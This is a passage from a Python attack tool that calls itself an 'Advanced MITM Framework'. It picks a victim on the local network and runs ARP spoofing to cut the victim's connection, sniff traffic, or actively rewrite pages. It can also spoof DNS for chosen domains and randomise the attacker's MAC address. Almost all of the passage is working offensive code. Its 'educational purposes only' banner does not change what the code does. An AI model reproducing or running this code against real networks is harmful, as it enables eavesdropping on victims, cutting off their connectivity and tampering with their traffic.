            threading.Thread(target=self.mitm_sniff, daemon=True).start()
        
        elif mode == 'active':
            # ========== ACTIVE MODE: MITM + MODIFICATION ==========
            console.print("[red]⚔️  Mode: ACTIVE MITM - Traffic Modification[/red]")
            
            # BẬT IP Forwarding
            self.set_ip_forward(True)
            
            # Khởi động Internal Forwarder
            self.internal_forwarder.start()
            
            # Thêm payload modification rules
            self.internal_forwarder.add_modification_rule("<title>", "<title>[PWNED] ")
            self.internal_forwarder.add_modification_rule("Google", "Googl3")
            
            # Selective DNS spoofing (nếu có)
            if selective_dns_targets:
                self.selective_dns = SelectiveDNSSpoofer(
                    selective_dns_targets,
                    self.get_my_ip(),
                    rate_limit_per_domain=5,
                    rate_limit_window=10
                )
                self.selective_dns.start(self.iface)
            
            # Sniff để monitor + capture
            threading.Thread(target=self.mitm_sniff, daemon=True).start()
        
        # Update dashboard stats periodically
        def update_stats():
            while self.running:
                if hasattr(self, 'internal_forwarder'):
                    self.dashboard.stats['packets_forwarded'] = self.internal_forwarder.packets_forwarded
                
                if hasattr(self, 'adaptive_spoofer'):
                    self.dashboard.stats['arp_packets'] += 1
                
                time.sleep(1)
        
        threading.Thread(target=update_stats, daemon=True).start()
        
        console.print(f"[bold green]✅ Attack started in {mode.upper()} mode![/bold green]")
    
    def set_ip_forward(self, enable):
        """Enable/disable IP forwarding"""
        if platform.system() == 'Linux':
            try:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1\n' if enable else '0\n')
                status = "ON" if enable else "OFF"
                console.print(f"[yellow]⚙️  IP Forwarding: {status}[/yellow]")
            except:
                pass
    
    def stop(self):
        """Dừng tất cả và khôi phục"""
        self.running = False
        
        if self.dashboard:
            self.dashboard.stop()
        
        console.print("\n[yellow]🔄 Stopping attack...[/yellow]")
        
        # Stop components
        if hasattr(self, 'adaptive_spoofer'):
            self.adaptive_spoofer.stop()
        
        if hasattr(self, 'internal_forwarder'):
            self.internal_forwarder.stop()
        
        if hasattr(self, 'selective_dns'):
            self.selective_dns.stop()
        
        if hasattr(self, 'sniffer'):
            try:
                self.sniffer.stop()
            except:
                pass
        
        # Restore ARP
        console.print("[cyan]🔡 Restoring ARP tables...[/cyan]")
        for _ in range(30):
            try:
                send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
                        hwdst=self.victim_mac, hwsrc=self.gateway_mac), verbose=0)
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip,
                        hwdst=self.gateway_mac, hwsrc=self.victim_mac), verbose=0)
                time.sleep(0.1)
            except:
                pass
        
        # Restore MAC
        self.mac_randomizer.restore()
        
        # Disable IP forward
        self.set_ip_forward(False)
        
        # Export report
        self.logger.export_report()
        
        console.print("[green]✅ Attack stopped and network restored[/green]")

# ==================== MAIN ====================
def check_privileges():
    """Check root/admin"""
    if platform.system() == 'Linux':
        if os.geteuid() != 0:
            console.print("[red]❌ Requires root! Run: sudo python3 script.py[/red]")
            sys.exit(1)
    elif platform.system() == 'Windows':
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                console.print("[red]❌ Requires Administrator![/red]")
                sys.exit(1)
        except:
            pass
    
    console.print("[green]✅ Privilege check passed[/green]\n")

def select_interface():
    """Select network interface"""
    console.print("\n[bold cyan]🔡 Select Interface:[/bold cyan]")
    
    if platform.system() == "Windows":
        interfaces = get_windows_if_list()
        valid_choices = []
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("No.", style="dim", width=4)
        table.add_column("Name", style="cyan")
        table.add_column("IP Address", style="green")
        
        idx = 1
        for i in interfaces:
            ip_display = ""
            if 'ips' in i and len(i['ips']) > 0:
                ipv4s = [x for x in i['ips'] if ":" not in x]
                if ipv4s:
                    ip_display = ipv4s[0]
            
            if ip_display or "Wi-Fi" in i['name'] or "Ethernet" in i['name']:
                table.add_row(str(idx), i['name'], ip_display)
                valid_choices.append(i)
                idx += 1
        
        console.print(table)
        choice = Prompt.ask("Select number", choices=[str(i) for i in range(1, len(valid_choices)+1)])
        return valid_choices[int(choice)-1]['name']
    
    else:
        interfaces = ni.interfaces()
        valid = [i for i in interfaces if ni.AF_INET in ni.ifaddresses(i)]
        for idx, i in enumerate(valid, 1):
            print(f"{idx}. {i}")
        choice = Prompt.ask("Select", choices=[str(i) for i in range(1, len(valid)+1)])
        return valid[int(choice)-1]

if __name__ == "__main__":
    try:
        check_privileges()
        
        # Banner
        banner = """
[bold red]
╔══════════════════════════════════════════════════════════════╗
║          🔥 ADVANCED MITM FRAMEWORK v3.0 🔥                 ║
║                                                              ║
║  Features:                                                   ║
║  • NetCut Mode - Cut victim's network                       ║
║  • Vendor Detection - Identify devices by manufacturer      ║
║  • OS Fingerprinting - Detect victim's operating system     ║
║  • Adaptive ARP Spoofing - Intelligent timing               ║
║  • Real-time Dashboard - Live traffic monitoring            ║
║                                                              ║
║  ⚠️  FOR EDUCATIONAL/TESTING PURPOSES ONLY ⚠️               ║
╚══════════════════════════════════════════════════════════════╝
[/bold red]
"""
        console.print(banner)
        
        # Select interface
        iface = select_interface()
        
        # Scan network với Vendor detection
        devices = scan_network(iface)
        
        if not devices:
            sys.exit(1)
        
        # Select target
        victim_ip = Prompt.ask("\n🎯 Select Victim IP", choices=[d['ip'] for d in devices])
        
        # Get network info
        try:
            from scapy.all import get_if_addr
            my_ip = get_if_addr(iface)
            network = '.'.join(my_ip.split('.')[:3] + ['.1'])
        except:
            network = '.'.join(victim_ip.split('.')[:3] + ['.1'])
        
        gateway_ip = Prompt.ask("🌐 Gateway IP", default=network)
        
        # ========== MODE SELECTION ==========
        console.print("\n[bold cyan]⚙️  Select Attack Mode:[/bold cyan]")
        console.print("[yellow]1. netcut  - Cut victim's network (NO forwarding)[/yellow]")
        console.print("[yellow]2. monitor - Passive sniffing (with forwarding)[/yellow]")
        console.print("[yellow]3. active  - Active MITM with payload modification[/yellow]")
        
        mode = Prompt.ask(
            "\n🎯 Attack Mode",
            choices=["netcut", "monitor", "active"],
            default="netcut"
        )
        
        # Additional options
        console.print("\n[bold cyan]⚙️  Additional Options:[/bold cyan]")
        randomize_mac = Confirm.ask("Randomize MAC address?", default=False)
        
        use_selective_dns = False
        selective_targets = None
        
        if mode == 'active':
            use_selective_dns = Confirm.ask("Use selective DNS spoofing?", default=False)
            
            if use_selective_dns:
                console.print("[yellow]Enter target domains (comma-separated):[/yellow]")
                console.print("[dim]Example: facebook.com,google.com,twitter.com[/dim]")
                targets_input = Prompt.ask("Domains")
                selective_targets = [t.strip() for t in targets_input.split(',')]
        
        # Confirmation
        console.print(f"\n[bold yellow]⚠️  About to start {mode.upper()} attack on {victim_ip}[/bold yellow]")
        
        if mode == 'netcut':
            console.print("[red]⚠️  WARNING: Victim will LOSE internet connection![/red]")
        
        if not Confirm.ask("Continue?", default=True):
            console.print("[yellow]Attack cancelled.[/yellow]")
            sys.exit(0)
        
        # Start attack
        attacker = EnhancedAttacker(victim_ip, gateway_ip, iface)
        attacker.start(
            mode=mode,
            randomize_mac=randomize_mac,
            selective_dns_targets=selective_targets
        )
        
        # Keep alive
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Interrupt received...[/yellow]")
        if 'attacker' in locals():
            attacker.stop()
        sys.exit(0)
    
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")
        import traceback
        traceback.print_exc()